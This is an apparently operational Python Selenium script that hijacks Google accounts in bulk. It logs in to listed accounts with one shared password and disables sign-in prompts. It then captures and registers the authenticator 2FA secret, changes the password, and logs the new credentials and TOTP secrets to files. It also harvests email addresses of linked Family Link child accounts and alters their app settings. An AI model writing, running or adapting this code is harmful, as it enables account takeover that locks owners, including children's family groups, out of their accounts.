import os,string,random,re,sys,urllib,time
from seleniumbase import Driver
from selenium import webdriver
from selenium.webdriver import ActionChains
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.select import Select 
from selenium.webdriver.chrome.options import Options 
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import concurrent.futures

def generate_random_string():
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(10))

def login(email,password):
    max_retries = 5
    attempt = 0
    
    while attempt <= max_retries:
        driver.get('https://myaccount.google.com/security')
        print("Login Email...")
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div > c-wiz > c-wiz > div > div.s7iwrf.gMPiLc.Kdcijb > div > div > c-wiz > section > div > div > div > div > div > div > header > div.m6CL9 > div'))).click()
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.NAME, 'identifier'))).send_keys(email)
        print("Email : "+email)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#identifierNext > div > button'))).click()
        try:
            WebDriverWait(driver, 7).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#password > div.aCsJod.oJeWuf > div > div.Xb9hP > input'))).send_keys(password)
            print("Password : "+password+"\n===================================")
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#passwordNext > div > button'))).click()
            # try:
            #     print("Checking Recovery Email")
            #     WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div.UXFQgc > div > div > div > form > span > section:nth-child(2) > div > div > section > div > div > div > ul > li:nth-child(3) > div'))).click()
            #     WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#knowledge-preregistered-email-response'))).send_keys(recovery_login)
            #     WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div.JYXaTc.lUWEgd > div > div.TNTaPb > div > div > button'))).click()
            # except:
            #     print("No Recovery")
            return True
        except:
            print("Captcha Require, Next Email...\n======================================")
            attempt += 1
            if attempt > max_retries:
                print("Max login attempts reached. Moving to the next email.")
                return False
def loqout():
    driver.get('https://accounts.google.com/SignOutOptions?hl=en&continue=https://myaccount.google.com/security&ec=GBRAwAE')
    time.sleep(2)
    WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#signout'))).click()

def change_password():
    while True:
        try:
            driver.get('https://myaccount.google.com/signinoptions/password')
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#i6'))).send_keys('123456tujuh@')
            time.sleep(1)
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#i12'))).send_keys('123456tujuh@')
            time.sleep(1)
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div > div.VfPpkd-WsjYwc.VfPpkd-WsjYwc-OWXEXe-INsAgc.KC1dQ.Usd1Ac.AaN0Dd.F2KCCe.NkyfNe.Z2xVec.E2bpG.injfOc > form > div > div.GFJYae.lY6Rwe > div > div > button'))).click()
            return True
        except:
            return False

def prom():
    print("Disable Prompts Android")
    try:
        driver.get('https://myaccount.google.com/connections/settings')
        ele = WebDriverWait(driver,5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div > div.Z54xyc > div > div > div > div > ul > li:nth-child(1) > div > div.kvjuQc.biRLo > div > button')))
        if ele.get_attribute('aria-checked') == "true":
            print("Status : Active")
            ele.click()
            print("Trying Disable Prompts...")
        else:
            print("Status : Disable")
        return True
    except Exception as e:
        print(e)
        print("Function Prompts Error")

def recovery_email():
    print("Add Recovery Email..")
    recovery = generate_random_string()+"@spotifyindo.com"
    print("Email Recovery : "+recovery+"\n===================================")
    max_attempts = 2
    attempt = 0
    while True:
        try:
            driver.get('https://myaccount.google.com/recovery/email?continue=https%3A%2F%2Fmyaccount.google.com%2Fsecurity%3Fhl%3Den%26utm_source%3DOGB%26utm_medium%3Dact')
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#i5'))).clear()
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#i5'))).send_keys(recovery)
            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div:nth-child(1) > div:nth-child(4) > div > form > div > div.GFJYae.lY6Rwe > div:nth-child(2) > div > button'))).click()
            time.sleep(5)
            print("Trying Verify...")
            driver.execute_script("window.open('');")
            driver.switch_to.window(driver.window_handles[1])
            driver.get("https://www.emailfake.com/"+recovery)
            try:
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, 'body > div.fc-consent-root > div.fc-dialog-container > div.fc-dialog.fc-choice-dialog > div.fc-footer-buttons-container > div.fc-footer-buttons > button.fc-button.fc-cta-consent.fc-primary-button'))).click()
            except:
                print("error validation open emailfake")
            try:
                otp_email = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#email-table > div.e7m.row.list-group-item > div.e7m.col-md-12.ma1 > div.e7m.mess_bodiyy > table > tbody > tr:nth-child(2) > td > table > tbody > tr > td:nth-child(2) > div.mdv2rw > div:nth-child(3) > div'))).text
                print("Otp Email : "+otp_email)
                driver.close()
                driver.switch_to.window(driver.window_handles[0])
                print("Submit OTP...")
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#c3'))).send_keys(otp_email)
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > div.uW2Fw-Sx9Kwc.uW2Fw-Sx9Kwc-OWXEXe-n2to0e.iteLLc.uW2Fw-Sx9Kwc-OWXEXe-FNFY6c > div.uW2Fw-wzTsW > div > div.uW2Fw-T0kwCb > div:nth-child(2) > button'))).click()
                return recovery
            except:
                driver.close()
                driver.switch_to.window(driver.window_handles[0])
                print("Error On OTP")
                attempt += 1
                if attempt >= max_attempts:
                    recovery = ""
                    WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#i5'))).clear()
                    WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div:nth-child(1) > div:nth-child(4) > div > form > div > div.GFJYae.lY6Rwe > div:nth-child(2) > div > button'))).click()
                    print("Max attempts reached. Cleaned Recovery Email.")
                    break
            recovery = generate_random_string()+"@spotifyindo.com"
            print("Email Recovery New: "+recovery+"\n===================================")
        except:
            print("Error, Lopp Recovery...")

def auth_2fa():
    print("Add Auth 2FA")
    while True:
        try:
            print("Retive Secrect Code...")
            driver.get('https://myaccount.google.com/two-step-verification/authenticator')
            try:
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div > div > div.ciRgbc.Ru61We > div.Mwd2Jc > div > div > div > button'))).click()
            except:
                print("Auth Already Add, Trying Update Auth")
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div > div > div.VfPpkd-WsjYwc.VfPpkd-WsjYwc-OWXEXe-INsAgc.KC1dQ.Usd1Ac.AaN0Dd.F2KCCe.NkyfNe.HYI7Re.yOXhRb.E2bpG.injfOc > div > div > ul > li > div > div.kvjuQc.biRLo > div > button'))).click()
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, "#yDmH0d > div.uW2Fw-Sx9Kwc.uW2Fw-Sx9Kwc-OWXEXe-n2to0e.iteLLc.uW2Fw-Sx9Kwc-OWXEXe-FNFY6c > div.uW2Fw-wzTsW > div > div.uW2Fw-T0kwCb > div:nth-child(2) > button"))).click()

            WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > div.oDVwOd.PHZhJd.iWO5td > div > div.GheHHf.GiAE0b.KNyhq.PjYkrd.iWO5td > span > div > div > div > div:nth-child(2) > center > div > div > button'))).click()
            secret_code = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > div.oDVwOd.PHZhJd.iWO5td > div > div.GheHHf.GiAE0b.KNyhq.PjYkrd.iWO5td > span > div > div > ol > li:nth-child(2) > div > strong'))).text
            secret_code = re.sub(r'\s+', '', secret_code)
            if secret_code:
                print("Secrect Code : "+secret_code)
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > div.oDVwOd.PHZhJd.iWO5td > div > div.GheHHf.GiAE0b.KNyhq.PjYkrd.iWO5td > div.sRKBBe > div > div:nth-child(2) > div:nth-child(2) > button'))).click()
                print("Retive OTP Auth...")
                driver.execute_script("window.open('');")
                driver.switch_to.window(driver.window_handles[1])
                driver.get('https://totp.danhersam.com/#/'+secret_code)
                otp_auth = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#token'))).text
                print("OTP Auth : "+otp_auth)
                driver.close()
                driver.switch_to.window(driver.window_handles[0])
                print("Submit OTP Auth...")
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#c2'))).send_keys(otp_auth)
                time.sleep(2)
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > div.oDVwOd.PHZhJd.iWO5td > div > div.GheHHf.GiAE0b.KNyhq.PjYkrd.iWO5td > div.sRKBBe > div > div:nth-child(2) > div:nth-child(3) > button'))).click()
                # print("Turn ON Auth 2FA")
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#ow8 > div > div > div.btFaIb > div > div.Jcq15c > div > div'))).click()
                WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div > div:nth-child(1) > div.ciRgbc.Ru61We > div.Mwd2Jc > div > div > div > button'))).click()
                WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > div.uW2Fw-Sx9Kwc.uW2Fw-Sx9Kwc-OWXEXe-n2to0e.iteLLc.uW2Fw-Sx9Kwc-OWXEXe-FNFY6c > div.uW2Fw-wzTsW > div > div.uW2Fw-T0kwCb > div:nth-child(2) > button'))).click()
                time.sleep(1)
                WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > div.uW2Fw-Sx9Kwc.uW2Fw-Sx9Kwc-OWXEXe-n2to0e.iteLLc.uW2Fw-Sx9Kwc-OWXEXe-FNFY6c > div.uW2Fw-wzTsW > div > div.uW2Fw-T0kwCb > div.qsqhnc > div > button'))).click()
                time.sleep(1)
                WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d#yDmH0d > div.uW2Fw-Sx9Kwc.uW2Fw-Sx9Kwc-OWXEXe-n2to0e.iteLLc.uW2Fw-Sx9Kwc-OWXEXe-FNFY6c > div.uW2Fw-wzTsW > div > div.uW2Fw-T0kwCb > div > div > button'))).click()
                time.sleep(2)
                break
        except Exception as e:
            print("Gagal, Retry...")
    return secret_code


def family():
    driver.get("https://myaccount.google.com/family/details?hl=en_US")
    for i in range(3,8):
        href_links.append(WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, f'#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > c-wiz > div > div.s7iwrf.gMPiLc > div > div > c-wiz > section > div:nth-child(1) > div > div > div:nth-child({str(i)}) > div.VfPpkd-ksKsZd-XxIAqe.CmhoVd.I6g62c > a'))).get_attribute('href').split('/g/')[-1])
    print(href_links)
    for i in range(len(href_links)):
        driver.get(f"https://families.google.com/familylink/kids/{str(href_links[i])}/settings/thirdpartyapps?webview=true&hideNavBar=true&hl=en_US")
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz.zQTmif.SSPGKf > div > div.M4P19c > div.jz7BQc > div > main > section > c-wiz > div > div:nth-child(2) > div'))).click()
        time.sleep(1)
    for i in range(len(href_links)):
        driver.get(f"https://myaccount.google.com/family/member/g/{str(href_links[i])}?hl=en_US")
        mail_list.append(WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, '#yDmH0d > c-wiz > div > div:nth-child(2) > div:nth-child(2) > c-wiz > div > div.VfPpkd-WsjYwc.VfPpkd-WsjYwc-OWXEXe-INsAgc.KC1dQ.Usd1Ac.AaN0Dd.F2KCCe.NkyfNe.HYI7Re.Z2xVec.E2bpG.injfOc > div > div > div > div > div > p:nth-child(2)'))).text)
        time.sleep(0.5)
    print(mail_list)


with open('list.txt', 'r') as file:
    emails = file.readlines()

failed_logins = []


while emails:
    href_links = []
    mail_list = []
    email = emails[0].replace('\n', '')
    
    if not email:
        break
    
    if email in failed_logins:
        emails.pop(0)
        continue
    
    bacot = re.split(r'[|:;]', email.strip())

    driver = Driver(uc=True)
    
    if login(bacot[0], "123456tujuh"):
        time.sleep(5)
        prom()
        time.sleep(2)
        # mail_reco = recovery_email()
        family()
        for i in range(len(mail_list)):
            with open('result_anak.txt', 'a') as result_file:
                result_file.write(f"{mail_list[i]}|{bacot[0]}\n")
        sec_code = auth_2fa()
        with open('result_ortu.txt', 'a') as result_file:
            result_file.write(f"{bacot[0]}|123456tujuh@|{sec_code}\n")
        change_password()
        time.sleep(2)
        loqout()

        time.sleep(2)
        
        emails.pop(0)
        
        with open('list.txt', 'w') as file:
            file.writelines(emails)
    else:
        failed_logins.append(email)


    
    driver.quit()


print("Done All")

# with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
#     executor.map(main, [urls] * 5)